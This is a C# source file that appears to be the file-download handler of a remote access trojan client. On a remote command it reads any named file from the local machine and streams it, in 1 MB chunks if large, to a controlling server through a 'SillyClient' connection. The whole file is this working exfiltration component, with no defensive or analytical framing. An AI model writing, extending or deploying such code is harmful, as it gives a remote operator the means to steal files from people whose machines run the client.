using Client.Connection;
using Client.Things;
using Stuff;
using System;
using System.IO;
using System.Text;

namespace Client.Handlers
{
    internal class HandleDownload
    {
        public static int OneMb = 1000000;
        public HandleDownload(Unpack unpack)
        {
            string file = unpack.GetAsString("File");
            string duid = unpack.GetAsString("DUID");
            if (File.Exists(file))
            {
                long fileSize = new FileInfo(file).Length;
                if (fileSize > 0)
                {
                    int count = 1;
                    if (fileSize < OneMb)
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "Download");
                        pack.Set("UID", UID.Get());
                        pack.Set("DUID", duid);
                        pack.Set("FileName", Path.GetFileName(file));
                        pack.Set("FileBytes", File.ReadAllBytes(file));
                        pack.Set("FileSize", fileSize);
                        pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(Path.GetFileName(file) + duid + count)));
                        pack.Set("TempCount", 1);
                        SillyClient.Send(pack.Pacc());
                    }
                    else
                    {
                        int bytesRead = 0;
                        long totalSize = fileSize;
                        byte[] buffer = new byte[OneMb];
                        using (Stream source = File.OpenRead(file))
                        {
                            while (((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0) && SillyClient.isConnected())
                            {
                                Pack pack = new Pack();
                                pack.Set("Packet", "Download");
                                pack.Set("UID", UID.Get());
                                pack.Set("DUID", duid);
                                pack.Set("FileName", Path.GetFileName(file));
                                pack.Set("FileBytes", buffer);
                                pack.Set("FileSize", fileSize);
                                pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(Path.GetFileName(file) + duid + (count++).ToString())));
                                pack.Set("TempCount", Convert.ToInt32((fileSize / OneMb) + 2));
                                SillyClient.Send(pack.Pacc());
                                totalSize -= bytesRead;
                                if (totalSize < OneMb)
                                    buffer = new byte[totalSize];
                            }
                        }
                    }
                }
            }
        }
    }
}